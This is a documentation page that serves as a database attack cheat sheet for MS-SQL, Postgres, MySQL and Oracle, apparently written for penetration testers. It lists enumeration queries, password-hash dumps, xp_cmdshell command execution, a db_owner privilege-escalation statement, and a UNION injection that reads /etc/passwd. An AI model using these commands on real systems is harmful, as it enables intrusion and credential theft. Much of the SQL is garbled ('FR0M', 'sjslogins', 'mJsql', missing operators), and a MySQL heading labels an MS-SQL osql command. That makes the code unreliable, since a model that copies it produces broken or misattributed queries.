---
title: Databases
sidebar: mydoc_sidebar
permalink: databases.html
folder: mydoc
---

# Database

Ms-sql

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">SELECT @@version</td>
       <td style="text-align:left">Database version</td>
     </tr>
     <tr>
       <td style="text-align:left">EXEC xp_msver</td>
       <td style="text-align:left">version details</td>
     </tr>
     <tr>
       <td style="text-align:left">EXEC master..xp_cmdshell &apos;net user&apos;</td>
       <td style="text-align:left">Run operating system command</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT HOST_NAME()</td>
       <td style="text-align:left">Get Hostname and IP</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT DB_NAME()</td>
       <td style="text-align:left">Current database</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT name FROM master..sysdatabases;</td>
       <td style="text-align:left">List of databases</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT user name()</td>
       <td style="text-align:left">Current user</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT name FROM master .. sjslogins</td>
       <td style="text-align:left">List of users</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>SELECT name FROM master..sysobjects WHERE</p>
         <p>xtype= &apos;U&apos;;</p>
       </td>
       <td style="text-align:left">list of tables</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>
         <p>SELECT name FROM syscolumns WHERE id=(SELECT</p>
         <p>id FR0M sysobjects WHERE name- &apos;mjtable&apos; ) ;</p>
       </td>
       <td style="text-align:left">List of columns</td>
     </tr>
   </tbody>
</table>

### Information about all database tables in the system table

```text
SELECT TOP 1 TABLE_NAME FROM INFORMATION SCHEMA.TABLES
```

### List of tables and columns

```text
SELECT name FROM Syscolumns WHERE id
(SELECT id FROM Sysobjects WHERE
name='mytable')
```

### Password hash

```text
SELECT name, password hash FROM master.sys.sgl_logins
```

### Bypass user access level

```text
execute('execute(''alter role [db_owner] add member [client]'') at "compatibility\poo_public"')
```

## Postgres

| **Command** | **Explanation** |
| :--- | :--- |
| SELECT version\(\); | Database version
| SELECT inet server\_addr\(\) | Get Hostname and IP
| SELECT current database\(\); | Current database |
| SELECT datname FROM pg database; | List of databases
| SELECT user; | Current user
| SELECT username FROM pg\_user; | List of users
| SELECT username,passwd FROM pg shadow | List of password hashes

### column list

```text
SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A,
pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND
(A.attrelid=C.oid) AND (A.atttjpid=T.oid) AND (A.attnum 0) AND (NOT
A.attisdropped) AND (N.nspname ILIKE 'public')
```

### List of tables

```text
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN
pg catalog.pg namespace n ON n.oid = c.relnamespace WHERE c.relkind IN
( 'r',") AND n.nspname NOT IN ( 'pg catalog', 'pg toast') AND
pg_catalog.pg_table_is_visible(c.oid)
```

## Mysql

| **Command** | **Explanation** |
| :--- | :--- |
| SELECT @@version; | Database version
| SELECT @@hostname; | Get Hostname and IP
| SELECT database\(\); | Current database |
| SELECT distinct \(db\) FROM mysql.db; | List of databases
| SELECT user\(\); | Current user
| SELECT user FROM mysql.user; | List of users
| SELECT host,user,password FROM mJsql.user; | Password hash list

### List of all tables and columns

```text
SELECT table schema, table name, column_name FR0M
information scherna.columns WHERE
table schema != 'mysql' AND table schema != 'information schema'
```

### Execution of operating system command in mysql

```text
osql -S ip , port -U sa -P pwd -Q "exec xp cmdshell `net user /add user
passr
```

### Reading readable files in mysql

```text
UNION ALL SELECT LOAD FILE( '/etc/passwd');
```

### Writing to the file system in mysql

```text
SELECT * FROM mytable INTO dumpfile '/tmp/somefile';
```


## Oracle

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">SELECT * FROM v$version;</td>
       <td style="text-align:left">Database version</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT version FROM v$instance;</td>
       <td style="text-align:left">Database version</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT instance name FROM v$instance;</td>
       <td style="text-align:left">Current database</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT name FROM v$database;</td>
       <td style="text-align:left">Current database</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT DISTINCT owner FROM all_tables;</td>
       <td style="text-align:left">List of databases</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT user FROM dual;</td>
       <td style="text-align:left">Current user</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>SELECT username FROM all_users ORDER BY</p>
         <p>username;</p>
       </td>
       <td style="text-align:left">List of users</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT column name FROM all_tab_columns;</td>
       <td style="text-align:left">List of columns</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT table name FROM all_tables;</td>
       <td style="text-align:left">list of tables</td>
     </tr>
     <tr>
       <td style="text-align:left">SELECT name, password, astatus FROM sys.user$;</td>
       <td style="text-align:left">List of password hashes</td>
     </tr>
   </tbody>
</table>

### List of databases

```text
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
```


{% include links.html %}
